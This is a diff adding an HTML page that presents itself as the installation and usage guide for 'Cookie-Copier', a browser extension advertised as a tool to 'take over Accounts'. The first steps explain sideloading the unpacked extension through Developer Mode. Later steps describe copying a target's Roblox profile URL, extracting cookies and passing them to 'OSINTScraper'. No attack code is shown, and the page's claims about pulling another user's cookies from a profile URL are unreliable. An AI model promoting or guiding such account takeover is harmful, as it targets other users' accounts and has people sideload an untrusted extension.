@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookie‑Copier Installation</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="nav-bar fade-in">
+    <div class="logo">Cookie‑Copier the tool that can take over Accounts</div>
+  </div>
+
+  <section class="hero fade-in">
+    <div class="hero-content">
+      <h1>How to Install Cookie‑Copier</h1>
+      <p class="sub-headline">Follow these simple steps to install the Browser-Extension.</p>
+      <p>This guide shows you exactly how to load Cookie‑Copier into your Browser Extensions.</p>
+    </div>
+  </section>
+
+  <section class="features fade-in">
+    <h2>Installation Steps</h2>
+
+    <div class="feature-grid">
+
+      <div class="feature-item">
+        <img src="png1.png" alt="Step 1" class="step-img">
+        <p class="step-text">Step 1: Once you have downloaded and extracted the Cookie‑Copier ZIP file, open your preferred web browser. Navigate to the Extensions Management area by clicking the three‑dot menu located in the upper‑right corner of the browser window. From the dropdown menu, hover over “Extensions” to reveal additional options, then select “Manage Extensions” to proceed.</p>
+      </div>
+
+      <div class="feature-item">
+        <img src="png2.png" alt="Step 2" class="step-img">
+        <p class="step-text">Step 2: Next, locate the Developer Mode toggle in the upper‑right corner of the Extensions Management page. Enable Developer Mode to unlock advanced controls, including the ability to manually load extensions directly from your file manager. This step is required in order to install Cookie‑Copier from the extracted folder rather than through the browser’s extension store.</p>
+      </div>
+
+      <div class="feature-item">
+        <img src="png3.png" alt="Step 3" class="step-img">
+        <p class="step-text">Step 3: Click the “Load unpacked” button within the Extensions Management page. This action will open your system’s file explorer, allowing you to navigate directly to the folder where you extracted the Cookie‑Copier ZIP file. Once the file explorer window appears, you can proceed to select the appropriate folder to install the extension.</p>
+      </div>
+
+      <div class="feature-item">
+        <img src="png4.png" alt="Step 4" class="step-img">
+        <p class="step-text">Step 4: In your file explorer, navigate to the folder where you extracted the Cookie‑Copier ZIP file. Ensure that the folder is fully unzipped browsers cannot load extensions directly from a compressed archive. Once you select and open the unzipped Cookie‑Copier directory, the browser will automatically import the extension and enable it. If the installation completes without any warnings or error messages, everything is successfully set up and ready to use.</p>
+      </div>
+
+      <h2>How to use Cookie‑Copier</h2>
+
+      <div class="feature-item">
+        <img src="png5.png" alt="Step 5" class="step-img">
+        <p class="step-text">Step 5: After installation, visit the website of your choice where you want to find vulnerable cookies that you can find, In this case the chosen website is Roblox. once you visited your target's profile copy the URL.</p>
+      </div>
+
+      <div class="feature-item">
+        <img src="png6.png" alt="Step 6" class="step-img">
+        <p class="step-text">Step 6: Open the extension and paste the URL like shown in the example. Once you have pasted the cookies select "Extract JSON" to gather the best results, let it search and copy. Once the cookies are copied ro your clipboard head over to OSINTScraper.</p>
+      </div>
+
+      <div class="feature-item">
+        <img src="png7.png" alt="Step 7" class="step-img">
+        <p class="step-text">Step 7: Once you are on the chat page from OSINTScraper choose the command dedicated to search for cookies. Simply paste the string into the brackets and your command is ready to be sent. The string you paste will be much longer than mine but dont be scared OSINTScraper will do its thing and print any found results in a simple and readable text.</p>
+      </div>
+
+    </div>
+  </section>
+
+  <script>
+    const fadeElements = document.querySelectorAll('.fade-in');
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) entry.target.classList.add('visible');
+      });
+    }, { threshold: 0.2 });
+
+    fadeElements.forEach(el => observer.observe(el));
+  </script>
+
+</body>
+</html>
